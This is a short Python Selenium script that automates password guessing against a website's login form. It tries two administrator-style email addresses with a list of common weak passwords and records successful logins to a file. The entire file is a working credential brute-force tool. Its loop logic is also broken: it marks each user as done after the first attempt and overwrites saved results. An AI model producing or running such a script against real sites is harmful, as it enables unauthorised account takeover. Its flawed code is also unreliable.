#!/usr/bin/python
import itertools
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def init_driver(url):
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)
    driver = webdriver.Chrome(chrome_options=options)
    driver.get(url)
    elem = driver.find_element_by_link_text("Iniciar Sesión")
    elem.click()
    return driver

def __main__():
    url = "https://example.com/es/"
    users = [
        "admin@example.com",
        "system@example.com",
    ]
    passwords = [
        "1234567",
        "1qazxsw2",
        "system",
        "system123",
        "system1234567",
        "sysadmin123",
        "1",
        "S3cr3tP455w0rd!",
        "a",
        "1234",
    ]
    found = []

    for u, p in itertools.product(users, passwords):
        if u not in found:
            driver = init_driver(url)
            sleep(2)
            mail = driver.find_element_by_id("_email_login")
            mail.send_keys(Keys.CONTROL, "a")
            mail.send_keys(u)
            passwd = driver.find_element_by_id("_password_login")
            passwd.send_keys(Keys.CONTROL, "a")
            passwd.send_keys(p)
            passwd.send_keys(Keys.RETURN)
            sleep(2)
            if 'aria-expanded="false">Mi Perfil <span' in driver.page_source:
                with open("/tmp/logins.txt", "w+") as _f:
                    _f.write(f"user: {u}, password: {p}")
            found.append(u)
        driver.close()

__main__()
